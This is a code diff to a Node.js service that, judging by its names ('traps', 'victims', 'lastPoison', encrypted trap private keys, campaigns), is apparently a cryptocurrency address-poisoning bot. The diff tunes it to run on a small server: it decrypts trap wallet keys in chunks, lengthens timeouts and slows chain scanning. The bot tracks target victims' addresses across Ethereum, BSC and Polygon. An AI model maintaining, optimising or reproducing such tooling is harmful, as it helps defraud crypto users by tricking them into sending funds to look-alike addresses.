@@ -39,7 +39,7 @@ if (supabaseUrl && supabaseServiceKey) {
         }
         return fetch(url, {
           ...options,
-          signal: AbortSignal.timeout(60000),
+          signal: AbortSignal.timeout(300000),
         });
       },
     },
@@ -483,33 +483,39 @@ async function loadTrapsFromDB() {
     let loaded = 0;
     const startTime = Date.now();
 
-    // 🚀 SPEED FIX: Pure synchronous loop. No chunking, no yielding, no console.log.
-    // We let the CPU blast through the decryption at maximum speed.
-    for (let i = 0; i < traps.length; i++) {
-      const row = traps[i];
-      try {
-        const privateKey = decrypt(row.trap_private_key_enc);
-        const victim = row.victim_address.toLowerCase();
-        const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
-        const campaignId = row.campaign_id;
+    // 🚀 RAM & CPU FIX: Decrypt in chunks of 500 to prevent Out-Of-Memory crashes on 1GB VPS
+    const CHUNK_SIZE = 500;
+    for (let i = 0; i < traps.length; i += CHUNK_SIZE) {
+      const chunk = traps.slice(i, i + CHUNK_SIZE);
 
-        const existing = victims.get(victim);
-        victims.set(victim, {
-          privateKey,
-          trapAddress: row.trap_address.toLowerCase(),
-          counterparty,
-          lastPoison: existing ? existing.lastPoison : 0,
-          lastCounterPoison: existing ? existing.lastCounterPoison : 0,
-          campaignId,
-          victimAddress: victim,
-        });
+      for (const row of chunk) {
+        try {
+          const privateKey = decrypt(row.trap_private_key_enc);
+          const victim = row.victim_address.toLowerCase();
+          const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
+          const campaignId = row.campaign_id;
 
-        // 🚀 Map this trap to its victim for the cache
-        trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
-        loaded++;
-      } catch (err) {
-        // Silently ignore bad decryptions to keep the loop blazing fast
+          const existing = victims.get(victim);
+          victims.set(victim, {
+            privateKey,
+            trapAddress: row.trap_address.toLowerCase(),
+            counterparty,
+            lastPoison: existing ? existing.lastPoison : 0,
+            lastCounterPoison: existing ? existing.lastCounterPoison : 0,
+            campaignId,
+            victimAddress: victim,
+          });
+
+          trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
+          loaded++;
+        } catch (err) {
+          // Silently ignore bad decryptions
+        }
       }
+
+      // 🚀 Yield to the event loop and force Garbage Collection between chunks
+      await new Promise(resolve => setImmediate(resolve));
+      console.log(`[DEBUG] ⏳ Decrypted ${loaded}/${traps.length} traps...`);
     }
 
     // 🚀 Log loaded settings to verify DB read
@@ -560,9 +566,12 @@ const EXEC_TIMEOUT_MS = 180000;
 
 // 🚀 Chain-aware scanning parameters
 const CHAIN_SCAN_CONFIG = {
-  ethereum: { blockTimeMs: 12000, pollIntervalMs: 15000, maxBlocksPerScan: 10 },
-  bsc: { blockTimeMs: 3000, pollIntervalMs: 6000, maxBlocksPerScan: 30 },
-  polygon: { blockTimeMs: 2000, pollIntervalMs: 5000, maxBlocksPerScan: 40 },
+  // 🚀 OPTIMIZED: Reduced blocks to 2, increased poll to 24s to save massive CPU
+  ethereum: { blockTimeMs: 12000, pollIntervalMs: 24000, maxBlocksPerScan: 2 },
+  // 🚀 OPTIMIZED: Reduced BSC blocks to 10, poll to 9s
+  bsc: { blockTimeMs: 3000, pollIntervalMs: 9000, maxBlocksPerScan: 10 },
+  // 🚀 OPTIMIZED: Reduced Polygon blocks to 15, poll to 8s
+  polygon: { blockTimeMs: 2000, pollIntervalMs: 8000, maxBlocksPerScan: 15 },
 };
 const scanConfig = CHAIN_SCAN_CONFIG[chainName] || CHAIN_SCAN_CONFIG.ethereum;
 
